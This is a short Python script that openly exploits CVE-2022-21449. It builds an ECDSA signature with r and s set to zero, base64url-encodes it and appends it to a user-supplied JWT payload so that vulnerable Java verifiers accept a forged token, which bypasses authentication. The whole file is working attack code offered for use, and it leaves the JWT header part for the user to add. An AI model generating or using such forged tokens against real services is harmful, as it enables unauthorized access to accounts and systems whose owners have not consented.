#!/usr/bin/env python3

import ecdsa as e
import base64 as b
import argparse

# This function creates an ECDSA signature with r=0, s=0 & order of the curve=1. 
# It then, BASE64 encodes it so that it can be used in JWT. 
def signature():
    #sigObj = e.ecdsa.Signature(0,0)    # This will generate the ECDSA signature of r=0, s=0 and order=1
    sig = e.util.sigencode_der(0,0,1)   # This will generate & encode. 
    out = b.urlsafe_b64encode(sig).decode()
    return out 

# This function removes padding from base64 encoded text. 
def suppress_padding(encodedText):
    if encodedText[-1] == '=':
        if encodedText[-2] == '=':
            return encodedText[:-2]
        return encodedText[:-1]
    return encodedText

# This function takes an un-encoded payload for bypassing authentication. 
def jwt_payload(payload):
    sig = signature()
    sig = suppress_padding(sig)     # This creates the signature portion. 
    payload = payload.encode('utf-8')
    encoded_payload = b.urlsafe_b64encode(payload).decode()     # Encoding payload to base64
    #print(encoded_payload)
    out_payload = suppress_padding(encoded_payload)
    #print(out_payload)
    return (out_payload + '.' + sig)    # Concatenate payload with the null signature that exploits CVE-2022-21449

parser = argparse.ArgumentParser(description='This Script generates signature & payload portions of JWT. It accepts a payload in plain text. CVE-2022-21449')
parser.add_argument('-p', '--payload', type=str, help='Payload portion of the JWT for auth bypass')
args = parser.parse_args()

if __name__ == '__main__':
    output = jwt_payload(args.payload)
    print(f'[+] JWT with Payload & Signature portion is: {output}')
